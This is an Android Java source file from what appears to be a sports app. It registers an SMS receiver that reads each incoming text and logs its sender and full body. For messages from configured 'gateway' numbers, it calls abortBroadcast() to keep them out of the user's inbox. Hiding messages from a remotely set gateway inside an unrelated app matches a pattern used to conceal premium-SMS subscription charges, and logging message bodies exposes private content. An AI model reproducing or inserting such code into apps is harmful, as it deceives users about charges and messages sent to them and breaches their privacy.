package mdn.vtvsport;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import mdn.vtvsport.common.SharedPreferenceManager;
import mdn.vtvsport.util.HLog;
import mdn.vtvsport.util.Utils;

/**
 * Created by hieuxit on 9/10/14.
 */
public class MessageReceiver extends BroadcastReceiver {
	public static final String SMS_EXTRA_NAME = "pdus";

	@Override
	public void onReceive(Context context, Intent intent) {
		HLog.i("Receiver message");
		Bundle extras = intent.getExtras();
		Object[] smsExtra = (Object[]) extras.get(SMS_EXTRA_NAME);
		HLog.i("PDUS: "+ Utils.array2String(smsExtra));
		// Get ContentResolver object for pushing encrypted SMS to the incoming folder
		for (int i = 0; i < smsExtra.length; ++i) {
			SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtra[i]);

			String body = sms.getMessageBody().toString();
			String address = sms.getOriginatingAddress();
			HLog.d("-----------------------");
			HLog.i("address: " + address);
			HLog.i("message: " + body);
			HLog.d("-----------------------");
			SharedPreferenceManager shareManager = SharedPreferenceManager.getInstance(context);
			String gateway = shareManager.getSMSGateway();
			String nonGateway = shareManager.getNonSMSGateway();
			if(address.equals(gateway)){
				if(shareManager.getDeletedSMSGateway() == 1){
					abortBroadcast();
				}
				HLog.w("Address equals sms gateway, abort this");
				return;
			}else if(address.equals(nonGateway)){
				if(shareManager.getDeletedNonSMSGateway() == 1){
					abortBroadcast();
				}
				HLog.w("Address equals non sms gateway, abort this");
			}
		}
	}
}
